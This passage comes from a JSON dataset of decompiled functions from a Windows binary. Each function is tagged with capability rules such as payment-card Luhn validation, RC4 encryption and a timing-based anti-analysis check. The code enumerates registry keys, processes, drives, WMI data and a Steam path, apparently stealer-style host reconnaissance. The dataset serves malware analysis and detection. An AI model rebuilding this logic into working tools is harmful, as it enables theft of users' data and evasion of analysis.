return;\n}\n",
        "token_count": 5946
    },
    "0041f1d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f1d0(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    uint var_14h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_8h = (**0x4692b4)(0, 0x104);\n    uVar1 = (**0x46923c)();\n    (**0x4691e0)(&var_14h);\n    (**0x4690ac)(uVar1, 0x447ca8, var_eh, var_14h._2_2_, var_14h, var_ch, var_ah, var_8h);\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 211
    },
    "0041f300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f300(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_20ch = 0xff;\n    var_104h = 0;\n    fcn.0042acb0(&var_103h, 0, 0xfe);\n    iVar1 = (**0x469180)(0x80000002, \"tree\", 0, 0x20119, &var_208h);\n    if (iVar1 == 0) {\n        (**0x469164)(var_208h, \"incomplete distance tree\", 0, 0, &var_104h, &var_20ch);\n    }\n    (**0x469208)(var_208h);\n    arg_8h = &var_104h;\n    (**0x4690bc)(arg_8h, &var_204h);\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 273
    },
    "0041f3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f3c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_c18h;\n    int32_t var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_804h;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_c10h = 0;\n    var_c0ch = 0;\n    var_c18h = 0xf003f;\n    var_c08h = 0;\n    iVar1 = (**0x469180)(0x80000002, \"ance code\", 0, 0x20019, &var_c10h);\n    if (iVar1 == 0) {\n        var_c14h = 0;\n        do {\n            var_c08h = 0x400;\n            iVar1 = (**0x4692ac)(var_c10h, var_c14h, &var_c04h, &var_c08h, 0, 0, 0, 0);\n            if (iVar1 == 0) {\n                (**0x4690ac)(&var_804h, 0x446e60, \"ance code\", &var_c04h);\n                iVar2 = (**0x469180)(0x80000002, &var_804h, 0, 0x20019, &var_c0ch);\n                if (iVar2 != 0) {\n                    (**0x469208)(var_c0ch);\n                    break;\n                }\n                var_c08h = 0x400;\n                iVar2 = (**0x469164)(var_c0ch, \"invalid distance code\", 0, &var_c18h, &var_404h, &var_c08h);\n                if (iVar2 == 0) {\n                    (**0x469258)(arg_8h, &var_404h);\n                    var_c08h = 0x400;\n                    iVar2 = (**0x469164)(var_c0ch, 0x447d04, 0, &var_c18h, &var_404h, &var_c08h);\n                    if (iVar2 == 0) {\n                        (**0x469258)(arg_8h, 0x44702c);\n                        (**0x469258)(arg_8h, &var_404h);\n                        (**0x469258)(arg_8h, 0x447d00);\n                    }\n                    (**0x469258)(arg_8h, 0x44540c);\n                }\n                (**0x469208)(var_c0ch);\n            }\n            var_c14h = var_c14h + 1;\n        } while (iVar1 == 0);\n        (**0x469208)(var_c10h);\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 692
    },
    "0041f6a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f6a0(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_20ch = 0xff;\n    var_104h = 0;\n    fcn.0042acb0(&var_103h, 0, 0xfe);\n    iVar1 = (**0x469180)(0x80000002, 0x447d70, 0, 0x20119, &var_208h);\n    if (iVar1 == 0) {\n        (**0x469164)(var_208h, 0x447d64, 0, 0, &var_104h, &var_20ch);\n    }\n    (**0x469208)(var_208h);\n    arg_8h = &var_104h;\n    (**0x4690bc)(arg_8h, &var_204h);\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 280
    },
    "0041f840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f840(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar1 = (**0x4692b4)(0, 500);\n    uVar1 = (**0x46923c)(uVar1);\n    iVar6 = 0;\n    iVar2 = (**0x469228)(0, 0);\n    arg_8h = iVar2 * 4;\n    iVar3 = (**0x469200)(0x40);\n    uVar4 = (**0x469228)(iVar2, iVar3);\n    uVar5 = 0;\n    if (uVar4 != 0) {\n        do {\n            (**0x469124)(*(iVar3 + uVar5 * 4), 2, &var_204h, 0x200);\n            if (iVar6 == 0) {\n                (**0x4690ac)(uVar1, 0x446fd8, &var_204h);\n            }\n            else {\n                (**0x4690ac)(uVar1, 0x447da8, uVar1, &var_204h);\n            }\n            iVar6 = iVar6 + 1;\n            fcn.0042acb0(&var_204h, 0, 0x200);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar4);\n    }\n    if (iVar3 != 0) {\n        (**0x469300)(iVar3);\n    }\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 435
    },
    "0041f960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041f960(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uVar5 = 0;\n    var_4h = NULL;\n    uVar2 = (**0x440188)(0x448b80, 0, 1, \"invalid block type\", &var_4h);\n    if (-1 < uVar2) {\n        iVar3 = (**0x440178)(arg_8h);\n        if (iVar3 != 0) {\n            iVar4 = (**(*var_4h + 0x20))(var_4h, iVar3);\n            pcVar1 = *0x44016c;\n            if (-1 < iVar4) {\n                iVar4 = (**(*var_4h + 0xb4))(var_4h, -(arg_10h != '\\0'), &var_8h);\n                if (-1 < iVar4) {\n                    uVar6 = fcn.0042e9ff(var_8h);\n                    arg_ch[1] = uVar6 >> 0x20;\n                    *arg_ch = uVar6;\n                    uVar5 = 1;\n                    (*pcVar1)(var_8h);\n                }\n            }\n            (*pcVar1)(iVar3);\n        }\n        uVar2 = (**(*var_4h + 8))(var_4h);\n    }\n    return uVar2 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 382
    },
    "0041fa10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fa10(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_154h;\n    uint var_14ch;\n    uint var_130h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f128;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0;\n    var_154h = 0x128;\n    uVar1 = (**0x46929c)(2, 0, var_10h);\n    iVar2 = (**0x46910c)(uVar1, &var_154h);\n    if (iVar2 != 0) {\n        iVar2 = (**0x4691e4)(uVar1, &var_154h);\n        while (iVar2 != 0) {\n            (**0x469258)(arg_8h, 0x447dc0);\n            (**0x469258)(arg_8h, &var_130h);\n            (**0x469258)(arg_8h, 0x44702c);\n            puVar3 = fcn.004245b0(&var_2ch, var_14ch);\n            var_4h = 0;\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            (**0x469258)(arg_8h, puVar3);\n            var_4h = 0xffffffff;\n            if (0xf < var_18h) {\n                fcn.0042ac49(var_2ch);\n            }\n            var_18h = 0xf;\n            var_1ch = 0;\n            var_2ch = var_2ch & 0xffffff00;\n            (**0x469258)(arg_8h, 0x447028);\n            iVar2 = (**0x4691e4)(uVar1, &var_154h);\n        }\n    }\n    (**0x4690f0)(uVar1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 585
    },
    "0041fb40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041fb40(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack128;\n    uint var_6ch;\n    uint var_64h;\n    uint var_5ch;\n    int32_t var_54h;\n    int32_t *var_50h;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    int32_t *var_44h;\n    uint32_t var_40h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_24h;\n    ushort var_1eh;\n    ushort var_1ch;\n    ushort var_1ah;\n    uint var_18h;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f160;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack128 = *0x456900 ^ &stack0xfffffffc;\n    puStack20 = &uStack128;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._0_1_ = 0;\n    var_4h._1_3_ = 0;\n    var_14h_2 = uStack128;\n    (**0x440190)(0, 0);\n    (**0x44018c)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    var_50h = NULL;\n    (**0x440188)(0x448dd0, 0, 1, 0x448d00, &var_50h);\n    arg_8h = 0;\n    var_44h = NULL;\n    iVar1 = (**(*var_50h + 0xc))(var_50h, 0x447e30, 0, 0, 0, 0, 0, 0, &var_44h);\n    if (-1 < iVar1) {\n        (**0x440194)(var_44h, 10, 0, 0, 3, 3, 0, 0);\n        var_4ch = NULL;\n        iVar1 = (**(*var_44h + 0x50))(var_44h, 0x447ddc, 0x447de8, 0x20, 0, &var_4ch);\n        if (-1 < iVar1) {\n            var_48h = NULL;\n            var_54h = 0;\n            var_2ch = 0xf;\n            var_30h = 0;\n            var_40h = var_40h & 0xffffff00;\n            var_4h._0_1_ = 1;\n            if (var_4ch != NULL) {\n                (**(*var_4ch + 0x10))(var_4ch, 0xffffffff, 1, &var_48h, &var_54h);\n                if (var_54h == 0) {\n                    if (0xf < var_2ch) {\n                        fcn.0042ac49(var_40h);\n                    }\n                }\n                else {\n                    (**0x440174)(&var_64h);\n                    var_4h._0_1_ = 2;\n                    (**(*var_48h + 0x10))(var_48h, \"need dictionary\", 0, &var_64h, 0, 0);\n                    fcn.0041f960(var_5ch, &var_6ch, 1);\n                    (**0x4692ec)(&var_6ch, &var_24h);\n                    uVar2 = (**0x4692b4)();\n                    uVar2 = (**0x46923c)(uVar2, 0, 0x104);\n                    (**0x4690ac)(uVar2, 0x447ca8, var_1eh, var_24h._2_2_, var_24h, var_1ch, var_1ah, var_18h);\n                    (**0x440170)(&var_64h);\n                    fcn.00405ce0();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 1029
    },
    "0041fd20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fd20(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t arg_10h;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    \n    if (arg_8h != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0x7 < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= arg_8h) {\n            ppiVar2 = in_ECX;\n            if (0x7 < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (arg_8h < ppiVar2 + in_ECX[4] * 2) {\n                ppiVar2 = in_ECX;\n                if (0x7 < piVar1) {\n                    ppiVar2 = *in_ECX;\n                }\n                fcn.00412ce0(in_ECX, arg_8h - ppiVar2 >> 1, arg_ch);\n                return;\n            }\n        }\n    }\n    if (0x7ffffffe < arg_ch) {\n        fcn.0042a14e(0x4453fc);\n    }\n    if (in_ECX[5] < arg_ch) {\n        fcn.00412b60(arg_ch, in_ECX[4]);\n        if (arg_ch == NULL) {\n            return;\n        }\n    }\n    else if (arg_ch == NULL) {\n        in_ECX[4] = NULL;\n        if (0x7 < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar2 = in_ECX;\n    if (0x7 < in_ECX[5]) {\n        ppiVar2 = *in_ECX;\n    }\n    arg_10h = arg_ch * 2;\n    fcn.0042af40(ppiVar2, arg_8h, arg_10h);\n    in_ECX[4] = arg_ch;\n    if (in_ECX[5] < 0x8) {\n        *(arg_10h + in_ECX) = 0;\n        return;\n    }\n    *(arg_10h + *in_ECX) = 0;\n    return;\n}\n",
        "token_count": 544
    },
    "0041fe10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fe10(uint arg_8h)\n\n{\n    uint arg_ch;\n    ushort *in_ECX;\n    \n    *(in_ECX + 10) = 7;\n    *(in_ECX + 8) = 0;\n    *in_ECX = 0;\n    arg_ch = fcn.0042e8a3(arg_8h);\n    fcn.0041fd20(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0041fe50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fe50(uchar *arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_44h;\n    uint var_34h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f198;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = 0;\n    (**0x469144)(&var_58h, var_10h);\n    arg_8h_00 = fcn.004245b0(&var_2ch, var_44h);\n    var_4h = 0;\n    if (0xf < arg_8h_00[5]) {\n        arg_8h_00 = *arg_8h_00;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(arg_8h_00);\n    fcn.00406270(arg_8h_00, arg_ch);\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(var_44h);\n    return;\n}\n",
        "token_count": 398
    },
    "0041ff10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ff10(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    uint *arg_8h_00;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    iVar1 = (**0x4690a8)(&var_80h);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    if (iVar1 == 0) {\n        arg_ch = fcn.0042b420(0x447d5c);\n        arg_8h_00 = 0x447d5c;\n    }\n    else {\n        arg_ch = fcn.0042b420(&var_7ch);\n        arg_8h_00 = &var_7ch;\n    }\n    fcn.00406270(arg_8h_00, arg_ch);\n    fcn.0042ad2a(arg_ch);\n    return;\n}\n",
        "token_count": 268
    },
    "0041ff90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ff90(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_208h = 0xff;\n    var_104h = 0;\n    fcn.0042acb0(&var_103h, 0, 0xfe);\n    iVar1 = (**0x469180)(0x80000002, \"\", 0, 0x20119, &var_20ch);\n    if (iVar1 == 0) {\n        (**0x469164)(var_20ch, \"\\\\Soft\\\\Steam\\\\\", 0, 0, &var_104h, &var_208h);\n    }\n    (**0x469208)(var_20ch);\n    (**0x4690bc)(&var_104h, &var_204h);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(&var_204h);\n    fcn.00406270(&var_204h, arg_ch);\n    fcn.0042ad2a(arg_ch);\n    return;\n}\n",
        "token_count": 339
    },
    "00420090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00420090(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack164;\n    uint var_90h;\n    uint var_88h;\n    int32_t *var_80h;\n    int32_t *var_7ch;\n    int32_t *var_78h;\n    int32_t var_74h;\n    int32_t *var_70h;\n    uint var_68h;\n    uint var_4ch;\n    uint32_t var_30h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f1db;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack164 = *0x456900 ^ &stack0xfffffffc;\n    puStack20 = &uStack164;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._0_1_ = 0;\n    var_4h._1_3_ = 0;\n    var_14h_2 = uStack164;\n    (**0x440190)(0, 0);\n    (**0x44018c)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    var_7ch = NULL;\n    (**0x440188)(0x448dd0, 0, 1, 0x448d00, &var_7ch);\n    arg_8h = 0;\n    var_70h = NULL;\n    iVar1 = (**(*var_7ch + 0xc))(var_7ch, 0x447ecc, 0, 0, 0, 0, 0, 0, &var_70h);\n    if (-1 < iVar1) {\n        (**0x440194)(var_70h, 10, 0, 0, 3, 3, 0, 0);\n        var_78h = NULL;\n        iVar1 = (**(*var_70h + 0x50))(var_70h, 0x447ddc, 0x447e8c, 0x20, 0, &var_78h);\n        if (-1 < iVar1) {\n            var_80h = NULL;\n            var_74h = 0;\n            var_1ch = 0xf;\n            var_20h = 0;\n            var_30h = var_30h & 0xffffff00;\n            var_4h._0_1_ = 1;\n            if (var_78h != NULL) {\n                (**(*var_78h + 0x10))(var_78h, 0xffffffff, 1, &var_80h, &var_74h);\n                if (var_74h == 0) {\n                    if (0xf < var_1ch) {\n                        fcn.0042ac49(var_30h);\n                    }\n                }\n                else {\n                    (**0x440174)(&var_90h);\n                    var_4h._0_1_ = 2;\n                    (**(*var_80h + 0x10))(var_80h, 0x447e74, 0, &var_90h, 0, 0);\n                    fcn.0041fe10(var_88h);\n                    var_4h._0_1_ = 3;\n                    fcn.00424280(&var_68h, &var_4ch);\n                    fcn.00405ce0();\n                    fcn.0040bac0();\n                    (**0x440170)(&var_90h);\n                    fcn.00405ce0();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 930
    },
    "004202b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004202b0(uint8_t **arg_8h)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t *arg_10h;\n    uint uVar6;\n    uint8_t **ppuVar7;\n    uint *puVar8;\n    int32_t *in_FS_OFFSET;\n    uint *puVar9;\n    uint var_1ech;\n    uint *var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint32_t var_1c4h;\n    uint32_t var_1bch;\n    uint var_1ach;\n    uint32_t var_1a8h;\n    uint32_t var_1a0h;\n    uint var_190h;\n    uint32_t var_18ch;\n    uint32_t var_184h;\n    uint var_174h;\n    uint32_t var_170h;\n    uint32_t var_168h;\n    uint var_158h;\n    uint32_t var_154h;\n    uint32_t var_14ch;\n    uint var_140h;\n    uint32_t var_13ch;\n    ushort var_138h;\n    uint var_136h;\n    uint *var_130h;\n    uint8_t *var_120h;\n    uint8_t *var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f25d;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_1dch = 0;\n    var_11ch = 0xf;\n    var_120h = NULL;\n    var_130h = var_130h & 0xffffff00;\n    var_4h = 0;\n    iVar4 = (**0x46913c)(&var_114h, 0x104, var_10h);\n    if (iVar4 == 0) {\n        var_114h._0_1_ = 0x43;\n    }\n    puVar9 = NULL;\n    var_1e0h._0_1_ = var_114h;\n    var_1e0h._1_2_ = 0x5c3a;\n    var_1e0h._3_1_ = 0;\n    (**0x46908c)(&var_1e0h, 0, 0, &var_1dch, 0, 0, 0, 0);\n    var_140h = fcn.00420df0(&var_1dch);\n    uVar3 = fcn.00420df0(&var_1dch);\n    var_13ch = CONCAT22(var_13ch._2_2_, uVar3);\n    fcn.00420df0(&var_1dch);\n    iVar4 = 0;\n    do {\n        uVar1 = fcn.00420df0(&var_1dch);\n        *(&var_138h + iVar4) = uVar1;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    uVar5 = (**0x4692b4)(0, 0x104);\n    iVar4 = (**0x46923c)(uVar5);\n    if (iVar4 == 0) {\n        arg_8h[5] = 0xf;\n        arg_8h[4] = NULL;\n        *arg_8h = 0;\n        arg_10h = fcn.0042b420(0);\n        if (arg_10h == 0xffffffff) {\n            fcn.0042a14e(0x4453fc);\n        }\n        if (arg_8h[5] < arg_10h) {\n            fcn.00405b70(arg_10h, arg_8h[4]);\n        }\n        else if (arg_10h == NULL) {\n            arg_8h[4] = NULL;\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            *arg_8h = 0;\n            goto code_r0x00420436;\n        }\n        if (arg_10h != NULL) {\n            ppuVar7 = arg_8h;\n            if (0xf < arg_8h[5]) {\n                ppuVar7 = *arg_8h;\n            }\n            fcn.0042af40(ppuVar7, 0, arg_10h);\n            arg_8h[4] = arg_10h;\n            if (arg_8h[5] < 0x10) {\n                *(arg_8h + arg_10h) = 0;\n            }\n            else {\n                (*arg_8h)[arg_10h] = 0;\n            }\n        }\n    }\n    else {\n        (**0x4690ac)(iVar4, 0x447ef8, var_140h, var_13ch & 0xffff, CONCAT22(var_136h._2_2_, var_136h));\n        uVar5 = fcn.0042b420(iVar4);\n        fcn.0040baf0(iVar4, uVar5);\n        if (var_11ch < 0x10) {\n            var_1e8h = &var_130h;\n        }\n        else {\n            var_1e8h = var_130h;\n        }\n        puVar8 = var_1e8h + var_120h;\n        puVar9 = var_130h;\n        if (var_11ch < 0x10) {\n            puVar9 = &var_130h;\n        }\n        if (puVar9 != puVar8) {\n            iVar4 = var_1e8h - puVar9;\n            do {\n                uVar2 = fcn.0042e9d3(*puVar9);\n                *(puVar9 + iVar4) = uVar2;\n                puVar9 = puVar9 + 1;\n            } while (puVar9 != puVar8);\n        }\n        fcn.0041ff10(&var_1d8h);\n        puVar9 = &var_1bch;\n        var_4h._0_1_ = 1;\n        uVar5 = fcn.0040e670(puVar9, 0x14, 0x11);\n        var_4h._0_1_ = 2;\n        fcn.0041ff90(&var_1a0h);\n        var_4h._0_1_ = 3;\n        uVar6 = fcn.0040e670(&var_184h, 0, 0x18);\n        var_4h._0_1_ = 4;\n        uVar6 = fcn.00420260(&var_168h, &var_130h, uVar6);\n        var_4h = CONCAT31(var_4h._1_3_, 5);\n        ppuVar7 = fcn.004064b0(&var_14ch, uVar6, uVar5);\n        if (&var_130h != ppuVar7) {\n            if (0xf < var_11ch) {\n                fcn.0042ac49(var_130h);\n            }\n            var_11ch = 0xf;\n            var_120h = NULL;\n            var_130h = var_130h & 0xffffff00;\n            if (ppuVar7[5] < 0x10) {\n                fcn.0042b4b0(&var_130h, ppuVar7, ppuVar7[4] + 1);\n            }\n            else {\n                var_130h = *ppuVar7;\n                *ppuVar7 = NULL;\n            }\n            var_120h = ppuVar7[4];\n            var_11ch = ppuVar7[5];\n            ppuVar7[4] = NULL;\n            ppuVar7[5] = NULL;\n        }\n        if (0xf < CONCAT22(var_136h, var_138h)) {\n            fcn.0042ac49(var_14ch);\n        }\n        var_138h = 0xf;\n        var_136h._0_2_ = 0;\n        var_13ch = 0;\n        var_14ch = var_14ch & 0xffffff00;\n        if (0xf < var_154h) {\n            fcn.0042ac49(var_168h);\n        }\n        var_154h = 0xf;\n        var_158h = 0;\n        var_168h = var_168h & 0xffffff00;\n        if (0xf < var_170h) {\n            fcn.0042ac49(var_184h);\n        }\n        var_170h = 0xf;\n        var_174h = 0;\n        var_184h = var_184h & 0xffffff00;\n        if (0xf < var_18ch) {\n            fcn.0042ac49(var_1a0h);\n        }\n        var_18ch = 0xf;\n        var_190h = 0;\n        var_1a0h = var_1a0h & 0xffffff00;\n        if (0xf < var_1a8h) {\n            fcn.0042ac49(var_1bch);\n        }\n        var_1a8h = 0xf;\n        var_1ach = 0;\n        var_1bch = var_1bch & 0xffffff00;\n        if (0xf < var_1c4h) {\n            fcn.0042ac49(var_1d8h);\n        }\n        arg_8h[5] = 0xf;\n        arg_8h[4] = NULL;\n        *arg_8h = 0;\n        if (arg_8h != &var_130h) {\n            if (0xf < arg_8h[5]) {\n                fcn.0042ac49(*arg_8h);\n            }\n            arg_8h[5] = 0xf;\n            arg_8h[4] = NULL;\n            *arg_8h = 0;\n            if (var_11ch < 0x10) {\n                fcn.0042b4b0(arg_8h, &var_130h, var_120h + 1);\n                arg_8h[4] = var_120h;\n                arg_8h[5] = var_11ch;\n            }\n            else {\n                *arg_8h = var_130h;\n                arg_8h[4] = var_120h;\n                arg_8h[5] = var_11ch;\n            }\n            goto code_r0x0042044e;\n        }\n    }\ncode_r0x00420436:\n    if (0xf < var_11ch) {\n        fcn.0042ac49(var_130h);\n    }\ncode_r0x0042044e:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(puVar9);\n    return;\n}\n",
        "token_count": 2565
    },
    "004207d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
